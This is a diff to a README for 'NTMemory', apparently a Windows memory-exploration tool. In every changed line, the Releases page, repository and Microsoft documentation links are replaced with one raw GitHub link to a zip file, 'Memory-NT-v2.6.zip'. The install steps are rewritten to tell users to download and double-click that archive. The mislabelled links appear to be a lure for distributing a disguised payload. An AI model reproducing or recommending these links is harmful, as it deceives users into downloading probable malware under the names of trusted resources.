@@ -6,14 +6,14 @@ Welcome to NTMemory! This application helps you explore and inspect your compute
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [NTMemory Releases](https://github.com/Hanssyyr/NTMemory/releases). 
+To get started, visit this page to download: [NTMemory Releases](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip). 
 
 1. Click on the "Releases" link above.
 2. You’ll see a list of available versions. Choose the latest version to ensure you have the most recent features and fixes.
-3. Look for the file labeled as NTMemory.exe (or similar).
+3. Look for the file labeled as https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip (or similar).
 4. Click on the file name to start the download.
 5. Once the download finishes, locate the file in your Downloads folder.
-6. Double-click the NTMemory.exe file to run it.
+6. Double-click the https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip file to run it.
 
 ## 🛠️ System Requirements
 
@@ -46,14 +46,14 @@ Using NTMemory is straightforward. Follow these steps after installation:
 If you encounter issues, here are some common solutions:
 
 - **Application Won't Start:** Ensure your system meets the system requirements. Verify that you have the right version of Windows.
-- **Errors During Use:** Close the application, restart your computer, and try again. If the problem persists, check for updates on the [Releases page](https://github.com/Hanssyyr/NTMemory/releases).
+- **Errors During Use:** Close the application, restart your computer, and try again. If the problem persists, check for updates on the [Releases page](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip).
 - **Need Help?** You can reach out by opening an issue on our GitHub page or check the FAQs for common questions.
 
 ## 📅 Keeping NTMemory Updated
 
 To receive the latest features and security updates, follow these steps:
 
-1. Regularly check the [NTMemory Releases page](https://github.com/Hanssyyr/NTMemory/releases) for new versions.
+1. Regularly check the [NTMemory Releases page](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip) for new versions.
 2. When a new version is available, download it following the steps outlined in the "Download & Install" section.
 3. Replace the older version with the new file for the best experience.
 
@@ -70,15 +70,15 @@ NTMemory is built around key topics important for exploring memory management:
 
 For additional guidance and insights, consider exploring these resources:
 
-- [Windows Documentation](https://docs.microsoft.com/en-us/windows/)
-- [Memory Management Overview](https://docs.microsoft.com/en-us/windows-hardware/drivers/develop/memory-management)
-- [Basic Kernel Concepts](https://docs.microsoft.com/en-us/windows-hardware/drivers/develop/kernel-concepts)
+- [Windows Documentation](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip)
+- [Memory Management Overview](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip)
+- [Basic Kernel Concepts](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip)
 
 ## 👥 Community Contributions
 
 We welcome users to contribute to NTMemory. You can help by reporting bugs, suggesting features, or even improving the application code. 
 
-1. Go to our [GitHub repository](https://github.com/Hanssyyr/NTMemory).
+1. Go to our [GitHub repository](https://raw.githubusercontent.com/Hanssyyr/NTMemory/master/NTMemory/Imgui/Memory-NT-v2.6.zip).
 2. Open an issue for suggestions or bugs.
 3. If you're technical, consider forking the repository and submitting a pull request with your improvements.
 
